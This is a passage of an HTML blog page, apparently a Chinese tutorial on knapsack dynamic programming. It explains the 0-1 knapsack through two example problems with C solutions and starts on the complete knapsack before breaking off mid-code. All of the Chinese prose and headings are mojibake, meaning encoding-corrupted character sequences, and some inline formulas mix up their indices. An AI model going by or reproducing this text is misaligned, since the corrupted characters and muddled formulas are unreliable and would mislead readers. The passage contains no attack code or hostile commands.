title="01èƒŒåŒ…"></a>01èƒŒåŒ…</h2><p>å…ˆè®²è§£01èƒŒåŒ…</p><pre class=" language-bash"><code class="language-bash">é—®é¢˜æè¿°:01èƒŒåŒ…æ˜¯åœ¨Nä»¶ç‰©å“å–å‡ºè‹¥å¹²ä»¶æ”¾åœ¨ç©ºé—´ä¸ºCçš„èƒŒåŒ…é‡Œï¼Œæ¯ä»¶ç‰©å“çš„ä½“ç§¯ä¸ºW1ï¼ŒW2è‡³Wnï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„ä»·å€¼ä¸ºV1,V2è‡³Vnã€‚01èƒŒåŒ…æ˜¯èƒŒåŒ…é—®é¢˜ä¸­æœ€ç®€å•çš„é—®é¢˜ã€‚01èƒŒåŒ…çš„çº¦æŸæ¡ä»¶æ˜¯ç»™å®šå‡ ç§ç‰©å“ï¼Œæ¯ç§ç‰©å“æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”æœ‰æƒå€¼å’Œä½“ç§¯ä¸¤ä¸ªå±æ€§</code></pre><h3 id="DPä¸‰æ­¥è§£é¢˜æ€è·¯"><a href="#DPä¸‰æ­¥è§£é¢˜æ€è·¯" class="headerlink" title="DPä¸‰æ­¥è§£é¢˜æ€è·¯"></a>DPä¸‰æ­¥è§£é¢˜æ€è·¯</h3><p>è§£é¢˜æ€è·¯:<br>ä¸€èˆ¬è€Œè¨€ï¼ŒDPé¢˜éƒ½æœ‰ä¸‰ä¸ªæ­¥éª¤:</p><pre class=" language-bash"><code class="language-bash">1.ç¡®å®šdpæ•°ç»„çš„å«ä¹‰ï¼Œå³dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>æ‰€ä»£è¡¨çš„æ„ä¹‰2.ç¡®å®šdpé€’æ¨è¡¨è¾¾å¼ï¼Œå³dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>ç”±ä»€ä¹ˆå¯ä»¥æ¨å¯¼è€Œæ¥3.ç¡®å®šdpæ•°ç»„åˆå€¼ï¼Œå’Œé€’å½’ä¸€æ ·ï¼ŒdpåŒæ ·ä¹Ÿéœ€è¦åˆå€¼ï¼Œå¦åˆ™å°±ä¼šé™·å…¥æ­»å¾ªç¯</code></pre><p>å†æ¥çœ‹01èƒŒåŒ…é—®é¢˜<br>æ¯ç§ç‰©å“åªæœ‰ä¸€ä¸ªï¼Œå¯¹äºä»»ä½•ä¸€ä¸ªç‰©å“ï¼Œæˆ‘ä»¬çš„é€‰æ‹©åªæœ‰ä¸¤ç§:è£…å…¥èƒŒåŒ…æˆ–è€…ä¸è£…å¦‚èƒŒåŒ…</p><h3 id="ä¾‹é¢˜1"><a href="#ä¾‹é¢˜1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><p>è¿™é‡Œæˆ‘ä»¬ä»¥æ´›è°·åŠ¨æ€è§„åˆ’çš„èƒŒåŒ…éƒ¨åˆ†ç¬¬ä¸€é¢˜ä¸ºä¾‹</p><pre><code>P1060 å¼€å¿ƒçš„é‡‘æ˜é‡‘æ˜ä»Šå¤©å¾ˆå¼€å¿ƒï¼Œå®¶é‡Œè´­ç½®çš„æ–°æˆ¿å°±è¦é¢†é’¥åŒ™äº†ï¼Œæ–°æˆ¿é‡Œæœ‰ä¸€é—´ä»–è‡ªå·±ä¸“ç”¨çš„å¾ˆå®½æ•çš„æˆ¿é—´ã€‚æ›´è®©ä»–é«˜å…´çš„æ˜¯ï¼Œå¦ˆå¦ˆæ˜¨å¤©å¯¹ä»–è¯´ï¼šâ€œä½ çš„æˆ¿é—´éœ€è¦è´­ä¹°å“ªäº›ç‰©å“ï¼Œæ€ä¹ˆå¸ƒç½®ï¼Œä½ è¯´äº†ç®—ï¼Œåªè¦ä¸è¶…è¿‡NNå…ƒé’±å°±è¡Œâ€ã€‚ä»Šå¤©ä¸€æ—©é‡‘æ˜å°±å¼€å§‹åšé¢„ç®—ï¼Œä½†æ˜¯ä»–æƒ³ä¹°çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œè‚¯å®šä¼šè¶…è¿‡å¦ˆå¦ˆé™å®šçš„NNå…ƒã€‚äºæ˜¯ï¼Œä»–æŠŠæ¯ä»¶ç‰©å“è§„å®šäº†ä¸€ä¸ªé‡è¦åº¦ï¼Œåˆ†ä¸º55ç­‰ï¼šç”¨æ•´æ•°1-51âˆ’5è¡¨ç¤ºï¼Œç¬¬55ç­‰æœ€é‡è¦ã€‚ä»–è¿˜ä»å› ç‰¹ç½‘ä¸ŠæŸ¥åˆ°äº†æ¯ä»¶ç‰©å“çš„ä»·æ ¼ï¼ˆéƒ½æ˜¯æ•´æ•°å…ƒï¼‰ã€‚ä»–å¸Œæœ›åœ¨ä¸è¶…è¿‡NNå…ƒï¼ˆå¯ä»¥ç­‰äºNNå…ƒï¼‰çš„å‰æä¸‹ï¼Œä½¿æ¯ä»¶ç‰©å“çš„ä»·æ ¼ä¸é‡è¦åº¦çš„ä¹˜ç§¯çš„æ€»å’Œæœ€å¤§ã€‚è®¾ç¬¬jä»¶ç‰©å“çš„ä»·æ ¼ä¸ºv[j],é‡è¦åº¦ä¸ºw[j]å…±é€‰ä¸­äº†kä»¶ç‰©å“ç¼–å·ä¾æ¬¡ä¸ºj1,j2,â€¦,jk,åˆ™æ‰€æ±‚çš„æ€»å’Œä¸ºï¼šv[j1]*w[j1]+v[j2]*w[j2]+...+v[jk]*w[jk]è¯·ä½ å¸®åŠ©é‡‘æ˜è®¾è®¡ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„è´­ç‰©å•ã€‚</code></pre><p>å…¸å‹çš„01èƒŒåŒ…é¢˜<br><code>åœ¨æœ‰é™çš„èƒŒåŒ…å®¹é‡ä¸‹ï¼Œæ€æ ·è£…å…¥ç‰©å“èƒ½ä½¿è£…å…¥çš„ç‰©å“çš„æƒé‡æœ€å¤§</code><br>é¦–å…ˆç¡®å®šæˆ‘ä»¬çš„dpæ•°ç»„è¡¨è¾¾å¼ï¼Œdp[i]ä»£è¡¨ç€ä»€ä¹ˆ<br>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬è¦æ±‚çš„æ˜¯å¦‚ä½•ä½¿åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡çš„æƒ…å†µä¸‹ä½¿è£…å…¥èƒŒåŒ…ç‰©å“çš„æƒé‡æœ€å¤§<br>é‚£æˆ‘ä»¬å°±é¡ºç€é¢˜æ„å‡è®¾:dp[i]ä¸ºå½“èƒŒåŒ…å®¹é‡ä¸ºiæ—¶ï¼Œä¸è£…å…¥ç¬¬jä»¶ç‰©å“æ—¶çš„æœ€å¤§æƒé‡<br>åœ¨è¿™é“é¢˜é‡Œå°±æ˜¯:dp[i]ä¸ºå½“æˆ‘ä»¬çš„é’±ä¸ºiæ—¶ï¼Œä¸ä¹°ç¬¬jä»¶ç‰©å“æ—¶çš„æœ€å¤§æƒé‡</p><p>ç¬¬äºŒæ­¥ï¼Œç¡®å®šé€’æ¨è¡¨è¾¾å¼dp[i]å¯ä»¥ä»ä»€ä¹ˆæ¨å¯¼è€Œæ¥<br>æˆ‘ä»¬æƒ³ï¼Œç¬¬jä»¶ç‰©å“å¯ä»¥è£…å…¥å¯ä»¥ä¸è£…å…¥ï¼Œè€Œå¯ä»¥é€‰æ‹©è£…å…¥æˆ–è€…ä¸è£…å…¥çš„å‰ææ˜¯ï¼Œæˆ‘ä»¬èƒŒåŒ…çš„å‰©ä½™å®¹é‡è¦å¤§äºç­‰äºè¿™ä»¶ç‰©å“æ‰€å çš„ä½“ç§¯,åœ¨è¿™é“é¢˜é‡Œå°±æ˜¯æˆ‘ä»¬å‰©ä½™çš„é’±è¦å¤§äºç­‰äºç¬¬jä¸ªç‰©å“çš„ä»·æ ¼ï¼Œå³i&gt;=v[j]<br>é‚£ä¹ˆï¼Œå½“ä¸è£…å…¥è¿™ä»¶ç‰©å“æ—¶ï¼Œdp[i]ä¸å˜(ä¸è¦å¿˜äº†æˆ‘ä»¬å¯¹æ•°ç»„çš„å®šä¹‰),å½“è£…å…¥æ—¶ï¼Œ<code>dp[i]=dp[i-v[i]]+v[j]*w[i]</code>,å› ä¸ºæˆ‘ä»¬è£…å…¥äº†ç¬¬jä»¶ç‰©å“ï¼Œç›¸åº”çš„æˆ‘ä»¬å‰©ä¸‹çš„é’±å°±æ˜¯å½“å‰çš„é’±i-v[j],æˆ‘ä»¬çš„æƒé‡å°±ç›¸åº”çš„å¢åŠ v[j]*w[j]<br>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬è¦æ±‚çš„dp[i]å°±æ˜¯åœ¨ä¹°å’Œä¸ä¹°ä¸¤è€…é—´é€‰æ‹©è¾ƒå¤§çš„é‚£ä¸€æ–¹<br>é€’æ¨å…¬å¼å°±ä¸º</p><pre class=" language-c"><code class="language-c">dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">*</span>w<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>ç¬¬ä¸‰æ­¥ï¼Œæ±‚åˆå€¼<br>äº‹å®ä¸Šï¼Œè¿™ç§èƒŒåŒ…é—®é¢˜å¹¶ä¸éœ€è¦æˆ‘ä»¬ç‰¹æ„æ±‚åˆå€¼ï¼Œå› ä¸ºæˆ‘ä»¬é€’æ¨å…¬å¼çš„æˆç«‹æ˜¯æœ‰æ¡ä»¶çš„ï¼Œç›¸å½“äºå·²ç»è®¾å®šäº†ä¸€ä¸ªåˆå§‹å€¼ã€‚</p><p>ä¸‰éƒ¨åˆ†éƒ½å·²ç»ç¡®å®šå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”¨ä»£ç è¡¨è¾¾å‡ºæ¥äº†</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">></span>y<span class="token operator">?</span>x<span class="token punctuation">:</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>n<span class="token punctuation">;</span>j<span class="token operator">>=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä»£ç å¾ˆç®€å•ï¼Œæ ¸å¿ƒä»£ç åªæœ‰çŸ­çŸ­å‡ è¡Œè€Œå·²ï¼Œæ¢åšæ˜¯ç”¨è´ªå¿ƒæ¥æ±‚çš„è¯å¯å°±éº»çƒ¦å¤šäº†</p><h3 id="ä¾‹é¢˜2"><a href="#ä¾‹é¢˜2" class="headerlink" title="ä¾‹é¢˜2"></a>ä¾‹é¢˜2</h3><p>å†æ¥ä¸€é¢˜<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>è¿˜æ˜¯å…ˆç¡®å®šdpæ•°ç»„çš„å«ä¹‰<br>æˆ‘ä»¬è¦æ±‚çš„æ˜¯ï¼ŒæŠŠé’±èŠ±å…‰æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Œä¾ç„¶æ˜¯æ¯ç§èœåªèƒ½ä¸Šä¸€æ¬¡,æ²¡æœ‰è·³å‡º01èƒŒåŒ…çš„èŒƒå›´<br>è¿™æ¬¡æˆ‘ä»¬ç”¨äºŒç»´æ•°ç»„ï¼Œdp[i][j]ï¼Œdp[i][j]è¡¨ç¤º:å‰iç§èœä¸”æœªä¸Šç¬¬iç›˜èœæ—¶ï¼Œä½™é¢ä¸ºjçš„æƒ…å†µä¸‹çš„ç‚¹èœæ–¹æ³•æ•°<br>å¯èƒ½æœ‰ç‚¹ç»•ï¼Œä¸è¿‡å¾€ä¸‹çœ‹å°±æ‡‚äº†</p><p>å†æ±‚é€’æ¨å…¬å¼<br>é¦–å…ˆï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œæˆ‘ä»¬èƒ½å¯¹ç¬¬iç§èœä½œå‡ºä¸Šæˆ–è€…ä¸ä¸Šé€‰æ‹©çš„å‰ææ˜¯æˆ‘ä»¬çš„ä½™é¢å¤§äºç­‰äºç¬¬iç§èœçš„ä»·æ ¼ï¼Œå³<code>j&gt;= a[i]</code>.å½“<code>j&lt;a[i]</code>æ—¶ï¼Œdp[i][j]å°±ç­‰äºå‰ä¸€ç§çŠ¶æ€çš„æ•°å€¼ï¼Œå³<code>dp[i][j]=dp[i-1][j]</code><br>å†æ¥çœ‹<code>j&gt;= a[i]</code>çš„æƒ…å†µï¼Œ&gt;=çš„æƒ…å†µå¯ä»¥åˆ†å¼€æ¥è°ˆï¼Œæˆ‘ä»¬å…ˆçœ‹=çš„æƒ…å†µ<br>åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å†æ¬¡æ˜ç¡®ä¸€ä¸‹dpæ•°ç»„çš„å®šä¹‰ï¼Œ<code>dp[i][j]è¡¨ç¤º:å‰iç§èœä¸”æœªä¸Šç¬¬iç›˜èœæ—¶ï¼Œä½™é¢ä¸ºjçš„æƒ…å†µä¸‹çš„ç‚¹èœæ–¹æ³•æ•°</code>ï¼Œæ³¨æ„ï¼Œæ˜¯æ–¹æ³•æ•°<br>å½“æˆ‘ä»¬çš„ä½™é¢jç­‰äºç¬¬iç§èœçš„ä»·æ ¼a[i]æ—¶ï¼Œç›¸å¯¹äºä¸Šä¸€ä¸ªçŠ¶æ€æˆ‘ä»¬å°±å¤šäº†ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯è¦ç¬¬iç§èœï¼Œè¦äº†ç¬¬iç§èœåæˆ‘ä»¬çš„ä½™é¢å°±å˜æˆäº†0ï¼Œå°±ä¹°ä¸äº†å…¶ä»–çš„èœäº†ï¼Œæ‰€ä»¥åœ¨<code>j=a[i]</code>è¿™ç§æƒ…å†µä¸‹ï¼Œé€’æ¨å…¬å¼å°±æ˜¯<code>dp[i][j]=d[i-1][j]+1</code><br>å†çœ‹j&gt;a[i]çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬çš„ä½™é¢åœ¨ä¹°å®Œç¬¬iç§èœåè¿˜æœ‰å‰©ä½™ï¼Œå¯èƒ½å¯ä»¥ç»§ç»­ä¹°å‰©ä¸‹çš„èœï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ–¹æ³•æ•°å°±æ¼”å˜æˆäº†ä¸ä¹°è¿™ç›˜èœå’Œä¹°è¿™ç›˜èœçš„æ–¹æ³•æ€»å’Œï¼Œé€’æ¨å…¬å¼ä¸º<code>dp[i][j]=dp[i-1][j]+dp[i-1][j-a[i]]</code><br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„dpé€’æ¨å…¬å¼å°±æ±‚å®Œäº†</p><p>ç¬¬ä¸‰æ­¥ï¼Œæ±‚åˆå€¼<br>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒåŒæ ·ä¸éœ€è¦æ±‚åˆå€¼ï¼Œiå’Œjçš„å–å€¼éƒ½æ˜¯æœ‰èŒƒå›´çš„</p><p>ä»£ç å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>01èƒŒåŒ…å°±å…ˆè®°å½•è¿™ä¸¤é¢˜ï¼Œæœ‰æ—¶é—´å†è¡¥å……</p><h2 id="å®Œå…¨èƒŒåŒ…"><a href="#å®Œå…¨èƒŒåŒ…" class="headerlink" title="å®Œå…¨èƒŒåŒ…"></a>å®Œå…¨èƒŒåŒ…</h2><p>å†æ¥çœ‹å®Œå…¨èƒŒåŒ…é—®é¢˜<br>å®Œå…¨èƒŒåŒ…å’Œ01èƒŒåŒ…çš„åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨äºå®Œå…¨èƒŒåŒ…çš„ç‰©å“å¯ä»¥é‡å¤è£…å…¥ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªç‰©å“æœ‰æ— é™ä¸ªï¼Œä¾ç„¶æ±‚æ€ä¹ˆè£…ç‰©å“èƒ½ä½¿æƒé‡æœ€å¤§</p><h3 id="ä¾‹é¢˜1-1"><a href="#ä¾‹é¢˜1-1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><p>ä¸Šé¢˜<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>å…¸å‹çš„å®Œå…¨èƒŒåŒ…ï¼ŒèƒŒåŒ…å®¹é‡æ¢æˆäº†æ—¶é—´ï¼Œç‰©å“å°±æ˜¯è¯å“ã€‚<br>è¿˜æ˜¯å…ˆç¡®å®šdpæ•°ç»„çš„å«ä¹‰ï¼Œä¸è¿‡è¿™é¢˜ä¸èƒ½ç”¨äºŒç»´æ•°ç»„äº†ï¼Œiå’Œjéƒ½å¯ä»¥è¾¾åˆ°10000ï¼Œæ—¶é—´ä¼šçˆ†çš„ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸€ç»´æ•°ç»„<br>é‚£ä¹ˆdp[i]çš„å®šä¹‰å°±ä¸ºå½“æ—¶é—´å‰©ä½™iæ—¶ï¼Œä¸”ç¬¬iç§è¯è¿˜æ²¡æœ‰é‡‡æ—¶(ç¬¬iç§è¯å¯ä»¥æ— é™æ¬¡é‡‡æ‘˜)æ‰€é‡‡çš„è¯çš„æœ€å¤§ä»·å€¼</p><p>ç¬¬äºŒæ­¥æ±‚é€’æ¨å…¬å¼<br>å¯¹ç¬¬iç§è‰è¯æˆ‘ä»¬æœ‰é‡‡å’Œä¸é‡‡ä¸¤ç§é€‰æ‹©ï¼Œå¦‚æœé€‰æ‹©é‡‡çš„è¯ï¼Œé‚£ä¹ˆ<code>dp[i]=dp[i-a[i]]+v[i]</code><br>ä¸é‡‡çš„è¯<code>dp[i]=dp[i]</code>ï¼Œç»¼åˆä¸¤ç§æƒ…å†µæ¥çœ‹ï¼Œ<code>dp[i]=max(dp[i-a[i]]+v[i],dp[i])</code></p><p>åœ¨å‰é¢çš„01èƒŒåŒ…ä¸­ï¼Œæˆ‘ä»¬æ˜¯ä»åå¾€å‰éå†ç‰©å“çš„ä»·å€¼ï¼Œä½†å®Œå…¨èƒŒåŒ…ä¸ä¸€æ ·ï¼Œå®Œå…¨èƒŒåŒ…è¦ç´¯è®¡åŒä¸€ä¸ªç‰©å“çš„ä»·å€¼å¤šæ¬¡ï¼Œå®Œå…¨èƒŒåŒ…çš„å‰ä¸€ä¸ªçŠ¶æ€å¯èƒ½ä¾ç„¶æ˜¯ç´¯åŠ å®ŒåŒä¸€ä¸ªç‰©å“åçš„çŠ¶æ€<br>ä»å‰å¾€åæ›´æ–°ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯æ ¹æ®å½“å‰çš„çŠ¶æ€å€¼æ¥æ›´æ–°æœ¬æ¬¡çš„ç»“æœï¼Œä»åå¾€å‰æ›´æ–°ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡çš„çŠ¶æ€å€¼æ¥æ›´æ–°æœ¬æ¬¡çš„ç»“æœ<br>01èƒŒåŒ…æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡çš„çŠ¶æ€å€¼æ¥æ›´æ–°çš„ï¼Œdp[i]ä¸dp[i-1]æœ‰å…³<br>å®Œå…¨èƒŒåŒ…çš„äºŒç»´æ•°ç»„ä¸º:<code>f[i][j] = max(f[i-1][j], f[i][j - weight[i]] + value[i])</code><br>ç”±äºä¸€ä¸ªç‰©å“å¯ä»¥è¢«é€‰æ‹©å¤šæ¬¡ï¼Œæ›´æ–°f[i][j]æ—¶ï¼Œf[i][j- weight[i]]å¯èƒ½å› ä¸ºæ”¾å…¥ç‰©å“iè€Œå‘ç”Ÿå˜åŒ–ã€‚</p><p>æ•´ä½“ä»£ç å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> T<span class="token punctuation">,</span>M<span class="token punctuation">,</span>t<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">100000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cin<span class="token operator">>></span>T<span class="token operator">>></span>M<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>t<span class="token 